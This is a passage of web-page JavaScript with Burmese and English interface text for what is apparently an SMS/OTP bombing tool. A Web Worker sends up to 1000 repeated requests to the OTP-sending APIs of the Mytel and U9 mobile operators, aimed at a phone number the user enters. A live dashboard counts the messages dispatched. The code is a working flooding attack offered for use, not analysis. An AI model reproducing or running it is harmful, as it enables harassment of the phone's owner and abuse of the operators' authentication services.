  div.innerHTML = `<span class="log-idx">${idxText}</span><span class="log-time">${time}</span><span class="log-dot"></span><span class="log-msg">${msg}</span>`;

  if (logFilter !== 'all' && div.dataset.sev !== logFilter) div.style.display = 'none';

  const atBottom = box.scrollHeight - box.clientHeight <= box.scrollTop + 30;
  box.appendChild(div);
  while (box.childElementCount > 200) box.removeChild(box.firstElementChild);
  if (atBottom) box.scrollTop = box.scrollHeight;

  if (type === 'success') pushSpark('ok', success);
  if (type === 'error') pushSpark('err', fail);
}

function setLogFilter(f) {
  logFilter = f;
  document.querySelectorAll('.log-tab').forEach(b => b.classList.toggle('active', b.dataset.filter === f));
  document.querySelectorAll('.log-line').forEach(d => {
    const sev = d.dataset.sev || 'sys';
    d.style.display = (f === 'all' || sev === f) ? '' : 'none';
  });
}

function clearLogs() {
  const box = document.getElementById('logConsole');
  box.innerHTML = '';
  const div = document.createElement('div');
  div.className = 'log-line sys';
  div.dataset.sev = 'sys';
  div.innerHTML = `<span class="log-idx">[--]</span><span class="log-time">${new Date().toLocaleTimeString('en-GB', { hour12: false })}</span><span class="log-dot"></span><span class="log-msg">[SYSTEM] Telemetry cache cleared.</span>`;
  box.appendChild(div);
  sparks.ok = []; sparks.err = [];
  drawSpark('ok'); drawSpark('err');
}

function updateUI(running) {
  document.getElementById('startBtn').disabled = running;
  document.getElementById('stopBtn').disabled = !running;
  document.getElementById('startBtn').classList.toggle('engine-active', running);
  document.body.classList.toggle('running', running);
  document.getElementById('statusText').textContent = running ? 'DAEMON RUNNING' : 'STANDBY';
}

function updateProgress() {
  const pct = sessionTotal > 0 ? Math.min(100, (dispatched / sessionTotal) * 100) : 0;
  document.getElementById('arcFill').style.width = pct + '%';
  document.getElementById('arcPct').textContent = Math.round(pct) + '%';

  const ticks = document.querySelectorAll('#arcTicks .tick');
  const lit = Math.round((pct / 100) * ticks.length);
  ticks.forEach((t, i) => {
    if (i < lit && !t.classList.contains('on')) {
      t.classList.add('on');
    } else if (i >= lit && t.classList.contains('on')) {
      t.classList.remove('on');
    }
  });
}

function tickEta() {
  if (!sessionStart || !sessionTotal) return;
  const elapsed = (Date.now() - sessionStart) / 1000;
  const per = dispatched > 0 ? elapsed / dispatched : sessionDelay;
  const remain = Math.max(0, sessionTotal - dispatched);
  const eta = remain * per;
  document.getElementById('arcEta').textContent =
    remain === 0 ? '0s' :
    eta < 60 ? Math.ceil(eta) + 's' :
    Math.ceil(eta / 60) + 'm ' + (Math.ceil(eta) % 60) + 's';
}

function normalizePhone(raw) { return String(raw).replace(/[^\d+]/g, '').replace(/^\+/, ''); }
function detectOp(phone) {
  const c = normalizePhone(phone);
  return (c.startsWith('096') || c.startsWith('96') || c.startsWith('9596')) ? 'mytel' : 'u9';
}
function validate() {
  const p = document.getElementById('phoneInput');
  const c = document.getElementById('countInput');
  const d = document.getElementById('delayInput');
  p.classList.remove('invalid'); c.classList.remove('invalid'); d.classList.remove('invalid');

  const phone = normalizePhone(p.value.trim());
  if (!phone) { p.classList.add('invalid'); return { err: 'ဖုန်းနံပါတ် ထည့်ပါ။' }; }
  if (!/^(\+?95|0)?9\d{7,9}$/.test(phone)) { p.classList.add('invalid'); return { err: 'ဖုန်းနံပါတ် ပုံစံ မမှန်ပါ။ ဥပမာ 09xxxxxxxxx' }; }

  const count = parseInt(c.value, 10);
  if (!Number.isFinite(count) || count < 1 || count > 1000) {
    c.classList.add('invalid'); return { err: 'Iterations 1 မှ 1000 အတွင်း ဖြစ်ရမည်။' };
  }
  const delay = parseFloat(d.value);
  if (!Number.isFinite(delay) || delay < 0) {
    d.classList.add('invalid'); return { err: 'Interval သည် 0 သို့မဟုတ် အထက် ဖြစ်ရမည်။' };
  }
  return { phone, count, delay };
}

const workerCode = `
self.onmessage = async (e) => {
  const { phone, count, delay, operator } = e.data;
  function getOp(p) {
    const c = String(p).replace(/[^\\d+]/g, '');
    return (c.startsWith('096') || c.startsWith('96') || c.startsWith('9596')) ? 'mytel' : 'u9';
  }
  for (let i = 1; i <= count; i++) {
    const op = operator === 'auto' ? getOp(phone) : operator;
    self.postMessage({ type: 'attempt', idx: i, op: op.toUpperCase() });
    let url, init;
    if (op === 'mytel') {
      url = 'https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=' + encodeURIComponent(phone);
      init = { method: 'GET', mode: 'no-cors', cache: 'no-store' };
    } else {
      url = 'https://ecareappga.u9.com.mm/u9selfcareapi12.0/api/Authentication/SendOTP';
      init = { method: 'POST', mode: 'no-cors', cache: 'no-store', body: JSON.stringify({ phoneNumber: phone }) };
    }
    try {
      await fetch(url, init);
      self.postMessage({ type: 'success', idx: i, op: op.toUpperCase() });
    } catch (err) {
      self.postMessage({ type: 'fail', idx: i, op: op.toUpperCase(), err: 'Network' });
    }
    if (i < count) await new Promise(r => setTimeout(r, Math.max(0, delay * 1000)));
  }
  self.postMessage({ type: 'done' });
};
`;

function startAutomation() {
  if (worker) return;
  const v = validate();
  if (v.err) { logMsg(v.err, 'warn'); return; }

  success = 0; fail = 0; dispatched = 0;
  sessionTotal = v.count; sessionDelay = v.delay; sessionStart = Date.now();

  document.getElementById('successCount').textContent = '0';
  document.getElementById('failCount').textContent = '0';
  sparks.ok = []; sparks.err = [];
  drawSpark('ok'); drawSpark('err');
  updateProgress();

  if (etaTimer) clearInterval(etaTimer);
  etaTimer = setInterval(tickEta, 500);

  updateUI(true);

  const op = currentOp === 'auto' ? detectOp(v.phone) : currentOp;
  logMsg('Sequence initialized [' + op.toUpperCase() + '] → ' + v.phone, 'sys');

  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const url = URL.createObjectURL(blob);
  worker = new Worker(url);
  URL.revokeObjectURL(url);

  worker.postMessage({ phone: v.phone, count: v.count, delay: v.delay, operator: currentOp });

  worker.onmessage = (e) => {
    const d = e.data;
    if (d.type === 'attempt') {
      logMsg('Node #' + d.idx + ' | ' + d.op + ' | Dispatching…', 'info', d.idx);
    } else if (d.type === 'success') {
      success++; dispatched++;
      const el = document.getElementById('successCount');
      animateNumber(el, success - 1, success);
      bump(el);
      logMsg('Node #' + d.idx + ' | ' + d.op + ' | Sent (opaque)', 'success', d.idx);
      updateProgress(); tickEta();
    } else if (d.type === 'fail') {
      fail++; dispatched++;
      const el = document.getElementById('failCount');
      animateNumber(el, fail - 1, fail);
      bump(el);
      logMsg('Node #' + d.idx + ' | ' + d.op + ' | Failed (' + d.err + ')', 'error', d.idx);
      updateProgress(); tickEta();
    } else if (d.type === 'done') {
      stopAutomation();
      logMsg('Sequence complete. ' + (success + fail) + ' total. (' + success + ' ok, ' + fail + ' err)', 'sys');
    }
  };

  worker.onerror = (err) => {
    logMsg('Worker error: ' + (err && err.message ? err.message : 'unknown'), 'error');
    stopAutomation();
  };
}

function stopAutomation() {
  if (worker) { try { worker.terminate(); } catch (e) {} worker = null; }
  if (etaTimer) { clearInterval(etaTimer); etaTimer = null; }
  updateUI(false);
  updateProgress();
  if (dispatched > 0) logMsg('Sequence terminated.', 'sys');
  else logMsg('Aborted before dispatch.', 'sys');
}

document.addEventListener('keydown', (e) => {
  if (e.key === 'Enter' && !document.getElementById('startBtn').disabled) {
    e.preventDefault(); startAutomation();
  } else if (e.key === 'Escape' && !document.getElementById('stopBtn').disabled) {
    e.preventDefault(); stopAutomation();
  }
});

setOperator('auto');
updateProgress();
</script>
